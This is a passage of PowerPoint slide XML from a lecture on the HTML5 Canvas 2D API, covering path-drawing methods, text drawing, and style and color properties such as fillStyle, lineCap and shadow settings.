            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>draws</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> anti-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>clockwise</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>otherwise</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>clockwise</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>arcTo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>x1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>y1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, x2, y2, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>radius</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>draws</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>circular</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>arc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>x1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>y1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>) to (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>x2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>y2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> radius</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>quadraticCurveTo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>cp1x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>cp1y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>draws</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>quadratic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>Bézier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>curve</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>where</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>cp1x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t> cp1y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>) is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>point</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>bezierCurveTo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>cp1x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>cp1y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>cp2x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>cp2y, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>x, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>draws</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>cubic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>Bézier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>curve</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>where</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>cp1x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t> cp1y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>) and (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>cp2x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t> cp2y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>)  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>are</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>point</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>rect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>adds</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>rectangle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>path</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1"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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20DC52ED-E370-498D-A46B-EDC04114FE22}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Drawing Text</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="141315" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F13CFD61-5B9C-48CB-BB43-C36BA82B6231}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>Attributes:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" b="1"/>
              <a:t>ctx.font</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t> = ”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" i="1"/>
              <a:t>fontsize font</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" b="1"/>
              <a:t>ctx.align</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>= ”left|right|center|</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" b="1"/>
              <a:t>start</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>|end”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>Methods:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" b="1"/>
              <a:t>fillText(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" b="1" i="1"/>
              <a:t>textToDraw, x, y [, maxWidth]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" b="1"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t> fill the text string to coordinates (x, y)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" b="1"/>
              <a:t>strokeText(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" b="1" i="1"/>
              <a:t>textToDraw, x, y [, maxWidth]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" b="1"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t> draw out of text string to coordinates (x, y)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI"/>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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BBA63AEB-495E-4787-98EC-88902706F847}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Canvas Styles &amp; Colors</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33795" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{649E8185-69F4-4B5B-BACF-3DD8E9456488}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>CanvasRenderingContext2D has several properties:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>fillStyle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> = the color/pattern/gradient used for filling paths</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>globalAlpha</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> = opacity of the canvas 0.0-1.0 (0 = fully transparent, 1 = no transparency, default)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>lineCap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> = butt |round |square (default is butt)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>lineJoin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>= round |bevel |miter (default is miter)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>lineWidth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> = line width in pixels (default is 1.0)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>miterLimit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>= how long the miter can be (default is 10)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>shadowBlur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>shadowColor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>shadowOffsetX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>shadowOffsetY</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> = for setting up shadows (default values are 0 and default color is black)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>strokeStyle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>= color/pattern/gradient used for stroking paths</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>fillStyle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>strokeStyle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> colors are any legal CSS color string, common formats are "#</a:t>
            </a:r>
            <a:r>
